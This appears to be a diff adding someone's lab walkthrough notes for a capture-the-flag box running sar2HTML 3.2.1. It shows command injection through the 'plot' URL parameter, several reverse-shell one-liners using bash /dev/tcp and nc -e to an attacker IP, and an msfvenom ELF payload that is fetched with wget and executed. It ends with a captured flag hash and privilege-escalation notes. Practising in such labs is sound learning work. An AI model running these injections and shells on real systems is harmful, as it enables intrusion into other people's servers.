@@ -1,0 +1,95 @@
+------------------
+sar
+------------------
+192.168.224.35
+robots.txt -->sar2HTML
+probably a path/ directory 
+tried opening it but failed -why ? because ignored case sensitivity 
+
+Learning1 ::: directory names should be tried with case sensitivity in mind; linux servers are case sensitive 
+i.e abc.com/sar2html != abc.com/sar2HTML
+
+Learning2 ::: always try to open every path in 2 ways one with / appended at the end and one without  
+i.e abc.cpm/xyz and abc.com/xyz/
+
+
+found 
+http://192.168.224.35/sar2HTML/
+
+sar2html Ver 3.2.1
+
+└─$ searchsploit sar2html
+└─$ searchsploit -x php/webapps/47204.txt
+
+
+http://192.168.224.35/sar2HTML/index.php?plot=;whoami
+in select host drop menu ouput appears 
+
+Challenge durign RCE through weburl how to send commands with spaces and flags 
+
+tried and it was working outof the box 
+
+http://192.168.224.35/sar2HTML/index.php?plot=;uname%20-a
+
+Getting a reverse shell 
+http://192.168.224.35/sar2HTML/index.php?plot=;which%20python%20pearl%20bash%20nc%20wget
+found nc and bash and wget to be there 
+wget is there we can drop an elf binary and get a rev shell 
+
+try one liner reverse shell 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+try 1 
+bash -i >& /dev/tcp/192.168.45.5/4242 0>&1
+bash%20-i%20%3E&%20/dev/tcp/192.168.45.5/4242%200%3E&1
+not working 
+192.168.45.5/24 
+
+nc -nvlp 4242 
+not working 
+why 
+2 options : 
+maybe egress port 4242 is blocked 
+or the command is not parsed properly 
+
+
+nc -e /bin/sh 192.168.45.5 4242
+command is parsed properly but shell not coming 
+nc -e /bin/bash 10.0.0.1 4242
+nc -c bash 10.0.0.1 4242
+none of them working 
+
+msfvenom -- elf --- wget -- python http server -- executing bash and elf 
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=8080 -f elf -o abc
+
+msfvenom -l p | grep linux 
+msfvenom -p aaaaaaa --list-options 
+msfvenom -l f 
+
+
+http://192.168.224.35/sar2HTML/index.php?plot=;wget%20http://192.168.45.5:8090/abc
+http://192.168.224.35/sar2HTML/index.php?plot=;chmod%20+x%20abc
+stripping + sign 
+http://192.168.224.35/sar2HTML/index.php?plot=;chmod%20777%20abc
+http://192.168.224.35/sar2HTML/index.php?plot=;ls%20-la
+http://192.168.224.35/sar2HTML/index.php?plot=;./abc
+
+
+
+cat local.txt --> accessbile by www-data 
+e79f354e00e4aa83f7d2eda63d573330
+another user named as love 
+
+priv esc 
+upgrading to tty shells without python 
+dropping ssh keys for ssh login to love user 
+how to check if u can write in a directory 
+how to check if user is allowed to ssh 
+
+
+sudo as admin successful file name is a hint 
+escalate to love then from love do sudo 
+
+upgrade dumb shell without python 
+https://www.schtech.co.uk/linux-reverse-shell-without-python/
+
